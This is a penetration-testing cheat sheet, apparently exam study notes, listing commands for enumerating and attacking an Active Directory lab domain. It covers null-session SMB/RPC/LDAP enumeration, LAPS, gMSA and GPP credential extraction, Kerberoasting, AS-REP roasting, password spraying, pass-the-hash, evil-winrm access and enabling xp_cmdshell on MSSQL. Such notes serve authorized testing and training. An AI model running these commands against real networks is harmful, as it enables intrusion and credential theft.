# 03 Active Directory — External Enumeration

## ⚡ Before Anything Else
```bash
# Add domain to hosts file FIRST
echo "192.168.102.227 bossingit.biz.local" | sudo tee -a /etc/hosts

# Verify DNS resolves
nslookup bossingit.biz.local 192.168.102.227
```

---

## Decision Flow — What Ports Do You Have?

```
88  (Kerberos)  → User enumeration with Kerbrute
135 (RPC)       → rpcclient null session, user/group enum
139/445 (SMB)   → Null/guest session, shares, spider, RID brute
389/636 (LDAP)  → Anonymous dump, user descriptions, LAPS check
3268/3269 (GC)  → Global catalog LDAP (cross-forest queries)
3389 (RDP)      → Try with found creds (xfreerdp3 / NXC verify first)
5985 (WinRM)    → Try with found creds (evil-winrm)

# EXAM RULE: If NXC confirms RDP auth but xfreerdp3 fails through tunnel → try evil-winrm immediately
```

---

## SMB — Anonymous / Null Session

```bash
# List shares anonymously
smbclient -N -L \192.168.102.227\\
smbclient -L \192.168.102.227\\ -U ''
impacket-smbclient "":''@192.168.102.227

# Connect to share
smbclient \192.168.102.227\\SomeShare -U 'guest'
smbclient //192.168.102.227/SHARE_$ -N --option='client min protocol=SMB2'

# Recursive download
smbclient //192.168.102.227/SHARE_$ -N -c "prompt OFF; recurse ON; mget *"

# NXC null session
nxc smb 192.168.102.227 -u '' -p '' --users
nxc smb 192.168.102.227 -u '' -p '' --shares
nxc smb 192.168.102.227 -u 'guest' -p '' --rid-brute   # Username harvest via RID

# Password policy (avoid lockouts before spraying)
nxc smb 192.168.102.227 --pass-pol

# SMB Spider (map all files)
nxc smb 192.168.102.227 -u '' -p '' -M spider_plus
nxc smb 192.168.102.227 -u USERNAME -p 'PASSWORD' -M spider_plus -o OUTPUT_FOLDER=./spider_out
nxc smb 192.168.102.227 -u USERNAME -p 'PASSWORD' -M spider_plus -o EXCLUDE_FILTER='print$,NETLOGON,SYSVOL,ipc$'

# Read spider output
cat spider_out/192.168.102.227.json | jq '.| map_values(keys)'

# Check for GPP passwords (can be gold)
nxc smb 192.168.102.227 -u USERNAME -p 'PASSWORD' -M gpp_password
nxc smb 192.168.102.227 -u USERNAME -p 'PASSWORD' -M gpp_autologin

# Check Kerberos auth
nxc smb bossingit.biz.local -u 'Alice' -p 'passw0rd123' -k --users
```

---

## RPC — Null Session & Enumeration

```bash
# Null session
rpcclient -U "" -N 192.168.102.227

# With creds
rpcclient -U "bossingit.biz/USERNAME%PASSWORD" 192.168.102.227
rpcclient -U nagoya-industries.com/svc_helpdesk 192.168.102.227

# Key commands inside rpcclient:
#   enumdomusers          — list all domain users
#   querydispinfo         — describe all users
#   enumdomgroups         — list all groups
#   querygroup <RID>      — group details
#   querygroupmem <RID>   — group membership
#   queryuser <RID>       — user details
#   lookupnames admin     — get SID
#   netshareenumall       — list all shares
#   srvinfo               — OS and domain info
#   lsaenumsid            — list all SIDs
#   setuserinfo2 USERNAME 23 NewPassword  — change password (if permitted)

# Get user info to file
rpcclient -W '' -c querydispinfo -U''%'' '192.168.102.227' | tee rpc_userinfo.txt

# Look up specific account SID
rpcclient $> lookupnames administrator@sub.domain.com
rpcclient $> lookupnames "Enterprise Admins"
```

---

## LDAP Enumeration

### Port Context
```
389  → Standard LDAP (unencrypted)
636  → LDAPS (SSL/TLS)
3268 → Global Catalog (cross-forest, partial attributes)
3269 → Global Catalog over SSL
```

### Nmap LDAP
```bash
nmap -v -p 389,636,3268,3269 -oN LDap-Nmap.txt -d --script "ldap* and not brute" 192.168.102.227
```

### Anonymous / Unauthenticated LDAP

```bash
# Phone book of AD — get everything from root DSE
ldapsearch -H ldaps://bossingit.biz.local:636/ -x -s base -b '' "(objectClass=*)" "*" +

# Check for open anonymous data
ldapsearch -x -H ldap://192.168.102.227 -D '' -w '' -b "DC=bossingit.biz,DC=local" -v | tee ldapsearch-Initial-Report.txt

# Get users
ldapsearch -x -H ldap://192.168.102.227 -b "DC=bossingit.biz,DC=local" "(objectClass=user)"

# Get just descriptions (often contain passwords)
ldapsearch -x -H ldap://192.168.102.227 -b "DC=bossingit.biz,DC=local" "(objectClass=user)" description

# Windapsearch (clean output)
windapsearch --dc 192.168.102.227 --domain bossingit.biz.local -m users --full | tee Windap_Users_Search.txt

# Find anomalies in LDAP dump
ldapsearch -x -H ldap://192.168.102.227 -b "DC=bossingit.biz,DC=local" "(objectClass=user)" > ldap-users-raw.txt
cat ldap-users-raw.txt | awk '{print $1}' | sort | uniq -c | sort -n
```

### Authenticated LDAP

```bash
# Standard authenticated search
ldapsearch -x -H ldap://192.168.102.227 -D "USERNAME@bossingit.biz.local" -w 'PASSWORD' -b "DC=bossingit.biz,DC=local" "(objectClass=user)"

# Get LAPS password (ms-MCS-AdmPwd) — try this with any valid creds!
ldapsearch -v -x -D "USERNAME@bossingit.biz.local" -w 'PASSWORD' -b "DC=bossingit.biz,DC=local" -H ldap://192.168.102.227 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# Alternative LAPS format
ldapsearch -x -H 'ldap://192.168.102.227' -D 'bossingit.biz\USERNAME' -w 'PASSWORD' -b 'dc=bossingit.biz,dc=local' "(MS-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

### NXC LDAP Modules

```bash
# LAPS
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' -M laps

# ADCS
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' -M adcs

# Get domain SID
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' --get-sid

# User descriptions (often contain passwords)
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' -M get-desc-users

# ASREPRoast
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' --asreproast Hashes-AS-Rep-OUT.txt

# Kerberoast
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' --kerberoasting Hashes-Kbrst-OUT.txt

# BloodHound collection
nxc ldap bossingit.biz.local -u USERNAME -p 'PASSWORD' --bloodhound -c all --dns-server 192.168.102.227

# gMSA credentials (for service accounts like svc_apache$)
nxc ldap 192.168.102.227 -k -u 'USERNAME' -p 'PASSWORD' --gmsa
```

---

## Kerberos — User Enumeration (port 88)

```bash
# !! ADD bossingit.biz TO /etc/hosts FIRST !!

# Enumerate valid users
kerbrute userenum -d bossingit.biz.local --dc 192.168.102.227 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100

# Password spray (careful of lockout policy)
kerbrute passwordspray -d bossingit.biz.local --dc 192.168.102.227 users.txt 'Password123'

# Get TGT with valid creds
impacket-getTGT bossingit.biz.local/USERNAME:PASSWORD -dc-ip 192.168.102.227
export KRB5CCNAME=<TICKET_PATH>.ccache
nxc smb 192.168.102.227 --use-kcache
nxc ldap 192.168.102.227 --use-kcache
```

---

## BloodHound Collection

```bash
# RustHound (preferred — quiet and thorough)
rusthound-ce --domain bossingit.biz.local -u USERNAME -p 'PASSWORD' -o ./BH_USERNAME/

# NXC BloodHound
nxc ldap bossingit.biz.local -u USERNAME -p 'PASSWORD' --bloodhound --collection ALL --dns-server 192.168.102.227

# Zip output for BloodHound import
zip AD-BH-info.zip *.json
```

---

## Credential Spraying — After Getting Any Creds

```bash
# !! CHECK PASSWORD POLICY FIRST !!
nxc smb 192.168.102.227 --pass-pol
net accounts /domain

# SMB spray (domain)
nxc smb 192.168.102.227 -u users.txt -p passwords.txt --continue-on-success

# SMB spray (local auth — always try both)
nxc smb 192.168.102.227 -u users.txt -p passwords.txt --continue-on-success --local-auth

# Pass the Hash spray across subnet
nxc smb 172.16.0.0/24 -u administrator -H 'NTHASH' --local-auth

# All protocols with found credentials — see Have_Creds.md
# EXAM RULE: Always spray ALL protocols with new creds before moving on
# Protocol order: smb, winrm, wmi, rdp, mssql, ssh, ftp
```

---

## RDP (port 3389)

```bash
# Verify creds work before connecting
nxc rdp 192.168.102.227 -u USERNAME -p 'PASSWORD'
nxc rdp 192.168.102.227 -u USERNAME -H NTHASH

# Connect — standard
xfreerdp3 /u:"USERNAME" /p:"PASSWORD" +clipboard /v:192.168.102.227 /cert:ignore

# Connect through Ligolo tunnel — NLA issues? Try these:
xfreerdp3 /u:USERNAME /pth:NTHASH /v:INTERNAL_IP /cert:ignore /sec:rdp
xfreerdp3 /d:bossingit.biz /u:USERNAME /pth:NTHASH /v:INTERNAL_IP /cert:ignore /sec:rdp

# EXAM RULE: xfreerdp3 fails through tunnel? → try evil-winrm immediately
evil-winrm -i INTERNAL_IP -u USERNAME -H NTHASH
```

---

## WinRM (port 5985/5986)

```bash
# Test
nxc winrm 192.168.102.227 -u USERNAME -p 'PASSWORD'
nxc winrm 192.168.102.227 -u USERNAME -H NTHASH

# Connect
evil-winrm -i 192.168.102.227 -u USERNAME -p 'PASSWORD'
evil-winrm -i 192.168.102.227 -u USERNAME -H NTHASH

# With file share (for tools)
evil-winrm -i 192.168.102.227 -u USERNAME -p 'PASSWORD' -s /home/kali/Tools/Scripts/ -e /home/kali/Tools/Executables/
```

---

## MSSQL (port 1433)

```bash
# Check with NXC
nxc mssql 192.168.102.227 -u USERNAME -p 'PASSWORD' -M mssql_priv
nxc mssql 192.168.102.227 -u USERNAME -p 'PASSWORD' -M enum_impersonate

# Connect
impacket-mssqlclient bossingit.biz.local/'USERNAME:PASSWORD'@192.168.102.227 -windows-auth
impacket-mssqlclient bossingit.biz.local/'USERNAME:PASSWORD'@192.168.102.227

# Through Ligolo tunnel (loopback service)
impacket-mssqlclient bossingit.biz/USERNAME:PASSWORD@240.0.0.1 -windows-auth

# Through Chisel
impacket-mssqlclient bossingit.biz/USERNAME:PASSWORD@127.0.0.1 -windows-auth

# Useful MSSQL queries:
# SELECT @@version
# SELECT distinct b.name FROM sys.server_permissions a
#   INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
#   WHERE a.permission_name = 'IMPERSONATE'
# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# EXEC xp_cmdshell 'whoami'
```
